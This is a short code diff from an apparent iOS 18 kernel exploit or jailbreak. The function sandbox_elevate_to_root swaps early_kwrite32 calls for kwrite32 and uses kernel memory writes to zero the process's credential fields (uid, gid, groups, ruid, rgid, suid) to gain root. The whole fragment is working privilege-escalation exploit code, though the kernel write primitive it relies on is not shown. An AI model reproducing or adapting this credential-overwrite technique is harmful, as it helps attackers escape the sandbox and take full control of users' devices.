@@ -279,15 +279,15 @@ int sandbox_elevate_to_root(uint64_t self_proc) {
     NSLog(@"[SBX] elevate: ourucred: 0x%llx (PAC-stripped)", ourucred);
 
     // ucred layout on iOS 18 arm64: ref(4) type(4) uid(4) gid(4) groups(16*4) ...
-    early_kwrite32(ourucred + 0x08, 0);  // cr_uid = 0
-    early_kwrite32(ourucred + 0x0C, 0);  // cr_gid = 0
+    kwrite32(ourucred + 0x08, 0);  // cr_uid = 0
+    kwrite32(ourucred + 0x0C, 0);  // cr_gid = 0
     for (int g = 0; g < 16; g++) {
-        early_kwrite32(ourucred + 0x10 + g * 4, 0);  // all groups = 0
+        kwrite32(ourucred + 0x10 + g * 4, 0);  // all groups = 0
     }
     // cr_ruid/cr_rgid/cr_suid follow groups
-    early_kwrite32(ourucred + 0x50, 0);   // cr_ruid = 0
-    early_kwrite32(ourucred + 0x54, 0);   // cr_rgid = 0
-    early_kwrite32(ourucred + 0x58, 0);   // cr_suid = 0
+    kwrite32(ourucred + 0x50, 0);   // cr_ruid = 0
+    kwrite32(ourucred + 0x54, 0);   // cr_rgid = 0
+    kwrite32(ourucred + 0x58, 0);   // cr_suid = 0
     NSLog(@"[SBX] elevate: wrote uid/gid fields to ucred");
 
     if (getuid() == 0) {
